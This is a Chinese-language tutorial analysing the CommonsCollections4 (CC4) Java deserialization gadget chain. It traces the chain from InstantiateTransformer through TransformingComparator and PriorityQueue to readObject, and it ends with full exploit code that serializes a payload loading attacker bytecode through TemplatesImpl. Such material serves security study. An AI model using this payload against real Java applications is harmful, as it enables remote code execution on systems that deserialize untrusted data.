###### tags: `Java 反序列化`
[TOC]
# Java 反序列化之CC4-5

## 0x01 前言

因为 CommonsCollections4 除 4.0 以外的版本去掉了 InvokerTransformer 的 Serializable 继承，所以导致无法序列化 InvokerTransformer。

还有一个有趣的地方是 CommonCollections4 的 ChainedTransformer 被修改了一下，好像是改成引用循环的形式，但是好在功能并没有改变，还是可以用 ChainedTransformer 来转变传入的对象类型。

![](https://i.imgur.com/TkE4TFs.png)


## 0x02 环境
- JDK8u65
- Maven 3.6.3
- Commons-Collections 4.0（之前的链子是 3.2.1）

Maven 下载 Commons-Collections 依赖。(在 IDEA 的 pom.xml 中添加如下代码)
```xml
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```
>下载好了之后建议手动让 Maven 下载一下 source 啥的，不然等会调试的时候可能会看到反编译的代码 (●'◡'●)

## 0x03 CC4 链分析




引用 yso 官方的说法，CC4 就是将 CC2 的 InvokerTransformer 换成了 InstantiateTransformer

![](https://i.imgur.com/ODszVAN.png)




从尾部向首部分析，尾部命令执行的方式就两种，**反射**或是**动态加载字节码**。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，这意味着不可以用 **InvokerTransformer.transform()**。但最后的命令执行不受影响。

CC4 中是通过 `InstantiateTransformer.transform()` 方法**动态加载字节码**的方式来进行命令执行的。

下图是该方法的定义：

![](https://i.imgur.com/lripS2J.png)


同时 InstantiateTransformer 类可序列化：

![](https://i.imgur.com/crPD3A0.png)


在此处 find usages，在 **TransformingComparator** 这个类中的 compare() 方法调用了 transform() 方法。

![](https://i.imgur.com/RzXEwCH.png)

![](https://i.imgur.com/l2yPy2S.png)


<!-- 构造函数中可设 this.transformer 的值,同时 obj1 传入 `TrAXFilter.class`，然后 transformer 的值设为 ChainedTransformer 实例对象。这样就会调用到 `ChainedTransformer.transform(TrAXFilter.class)` 然后进行转变得到  `TrAXFilter.class`

>注意注意：这里 obj1 传入 `TrAXFilter.class` 并不是直接传入，而是通过 ChainedTransformer.transform 和 ConstantTransformer.transform 把随便一个对象变成 `TrAXFilter.class`，正如我们在 CC1 中所做的那样。我曾经试过直接传并完成整个链子的构造，但是在 PriorityQueue.add 方法时会报出异常。 -->


![](https://i.imgur.com/dly6l8X.png)

这就是一条新的链子了，我们继续往前找，发现是 `PriorityQueue` 这个类中的 `siftDownUsingComparator()` 方法调用了之前的 `compare()` 方法。

![](https://i.imgur.com/ExRGY7M.png)

>挺离谱的，快一百个结果了。硬是被黑客们找到这条链子 ┭┮﹏┭┮

整体源码如下（重点关注721 行）：

![](https://i.imgur.com/clULWby.png)

上图的 comparator 是类的常量成员属性，可在构造方法中定义：

![](https://i.imgur.com/pRtSW5t.png)

![](https://i.imgur.com/JvDO5Up.png)

<!-- 根据前面的分析，我们需要让这里的 comparator 为 `TransformingComparator` 类实例对象。同时变量 c 应对应着之前的 obj1，也就是一个 `TrAXFilter.class`，而 queue\[right\] 可以不管。 -->



不过 `siftDownUsingComparator()` 是私有的，在同类里面找一找谁调用了它。发现是 `siftDown()` 方法调用了 `siftDownUsingComparetor()` 

![](https://i.imgur.com/o06f1KV.png)

这又是一个私有方法，继续在同类下寻找发现是 `heapify()` 方法调用了 `siftDown()`

![](https://i.imgur.com/ePYOqzs.png)

这还是一个私有方法，继续寻找调用。最后发现同类的 `readObject()` 方法调用了 `siftDown()`。

>难怪要选择这一条链子，结尾的 readObject() 方法好似神来之笔，成功补足漏洞利用最后一环！

`readObject()` 方法源码（最后一行调用了 `heapify()` 方法）：

![](https://i.imgur.com/1OUVrcC.png)

到这里链子已分析完毕，接下来着手书写 exp！

## CC4 链 EXP
### 初步编写
- 我们先编写一个 InstantiateTransformer.transform() 的 EXP。


通过动态加载字节码的方式进行命令执行，和上一篇文章的 EXP 一样通过反射修改值，然后执行 transform() 方法。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
  
import javax.xml.transform.Templates;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// 构造 InstantiateTransformer.transform 的 EXPpublic class TransformOriEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
  
 instantiateTransformer.transform(TrAXFilter.class);  
 }  
}
```
### 最终 EXP
```java
package org.cc1;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
public class Exp1 {
// TransformingComparator.compare 的 EXPpublic class ComparatorEXP {
public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Drunkbaby");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("D:\\IDEAProject\\CC1\\cc1\\target\\classes\\org\\cc1\\Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
                new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //  instantiateTransformer.transform(TrAXFilter.class);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformingField = c.getDeclaredField("transformer");
        transformingField.setAccessible(true);
        transformingField.set(transformingComparator, chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
}
public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        }
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
        }
        }
```
## 流程图
![](https://i.imgur.com/8ibRNC8.png)


## 参考链接
[芜风师傅](https://drun1baby.github.io/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/)